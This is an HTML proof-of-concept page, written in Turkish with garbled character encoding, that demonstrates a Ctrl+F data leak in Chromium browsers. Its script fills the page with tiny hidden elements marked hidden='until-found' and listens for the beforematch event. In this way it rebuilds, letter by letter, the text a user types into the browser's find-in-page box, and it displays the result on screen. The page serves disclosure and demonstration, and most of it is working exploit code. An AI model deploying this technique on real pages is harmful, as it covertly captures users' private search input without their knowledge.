<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width">
<title>PoC: Sayfa Ä°Ã§i Arama (Ctrl+F) Veri SÄ±zÄ±ntÄ±sÄ±</title>

<script src="https://cdn.tailwindcss.com"></script>

<style>
  .textcenter { text-align: center }
  .textblue { color: #4169e1 }
  p { font-family: system-ui, -apple-system, BlinkMacSystemFont }
</style>

<script>
let detectedSequence = "";
const detected = new Set();
let container;

function cleanupOldCandidates(n) {
  container && container.querySelectorAll('p[id^="c_"]').forEach(e => {
    const len = e.getAttribute("data-sequence").length;
    if (len !== 1 && (len < n || n + 1 < len)) e.remove();
  });
}

function generateCandidates(prefix = "") {
  if (!container) return;

  const charset =
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 !\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~";

  if (prefix.length > 0) cleanupOldCandidates(prefix.length);

  for (let i = 0; i < charset.length; i++) {
    const seq = prefix + charset[i];
    const id = "c_" + encodeURIComponent(seq);

    if (container.querySelector("#" + CSS.escape(id))) continue;

    const p = document.createElement("p");

    /* ğŸ”´ KRÄ°TÄ°K: attribute olarak */
    p.setAttribute("hidden", "until-found");

    p.id = id;
    p.setAttribute("data-sequence", seq);
    p.textContent = seq.endsWith(" ") ? seq + "\u200B" : seq;

    p.style.fontSize = "1px";
    p.style.margin = "0";
    p.style.padding = "0";
    p.style.lineHeight = "1px";

    p.addEventListener("beforematch", () => {
      const current = p.getAttribute("data-sequence");

      if (current.length === 1) {
        detectedSequence = current;
        document.getElementById("result").textContent = current;
        detected.add(id);
        generateCandidates(current);
      } else if (!detected.has(id) && current.length > detectedSequence.length) {
        detected.add(id);

        const prevId = "c_" + encodeURIComponent(detectedSequence);
        const prev = container.querySelector("#" + CSS.escape(prevId));
        if (prev) {
          prev.setAttribute("hidden", "until-found");
          detected.delete(prevId);
        }

        detectedSequence = current;
        document.getElementById("result").textContent = current;
        generateCandidates(current);
      }
    });

    container.appendChild(p);
  }
}

window.addEventListener("load", () => {
  container = document.getElementById("search-candidates");
  generateCandidates();
});
</script>
</head>

<body class="bg-gray-50">

<!-- âš ï¸ Ã–NEMLÄ°: layout iÃ§inde, gizli ama render ediliyor -->
<div id="search-candidates"
     style="font-size:1px; line-height:1px; height:1px; overflow:hidden;">
</div>

<br>

<h1 class="text-3xl font-bold textcenter">
  Ctrl+F (Sayfada Bul) Veri SÄ±zÄ±ntÄ±sÄ± â€“ PoC
</h1>

<br>

<div class="py-6">
  <div class="mx-auto max-w-screen-md px-4">

    <div class="bg-white rounded-lg shadow-lg p-8 mb-8 border border-gray-200">
      <div class="flex items-center gap-4">
        <span class="text-xl text-gray-700 font-medium">
          AlgÄ±lanan Arama:
        </span>
        <span id="result"
              class="text-4xl font-bold text-blue-600 font-mono"></span>
      </div>

      <p class="text-lg mt-4">
        TarayÄ±cÄ±da <strong>Ctrl + F</strong> yapÄ±n ve deneme olarak
        <strong>beykozunsesi</strong> yazÄ±n.
      </p>

      <p class="text-sm text-gray-500 mt-2">
        Not: Bu sayfada input, form veya klavye dinleyicisi yoktur.
      </p>
    </div>

    <h2 class="textblue text-xl font-semibold mb-2">Bu sayfada ne oluyor?</h2>
    <p class="text-gray-700">
      Bu PoC, Chromium tabanlÄ± tarayÄ±cÄ±larda bulunan
      <code>hidden="until-found"</code> Ã¶zelliÄŸinin,
      sayfa iÃ§i arama (Ctrl+F) sÄ±rasÄ±nda bir
      <strong>side-channel (yan kanal) veri sÄ±zÄ±ntÄ±sÄ±na</strong>
      nasÄ±l dÃ¶nÃ¼ÅŸtÃ¼ÄŸÃ¼nÃ¼ gÃ¶sterir.
    </p>

    <p class="text-gray-700 mt-2">
      KullanÄ±cÄ± sadece sayfada arama yaptÄ±ÄŸÄ±nÄ± sanÄ±r; ancak tarayÄ±cÄ±,
      eÅŸleÅŸen gizli elementleri gÃ¶rÃ¼nÃ¼r hale getirir.
      Bu an <code>beforematch</code> olayÄ± ile JavaScript tarafÄ±ndan
      algÄ±lanabilir ve aranan kelime <strong>harf harf</strong> Ã§Ã¶zÃ¼lebilir.
    </p>

  </div>
</div>

</body>
</html>
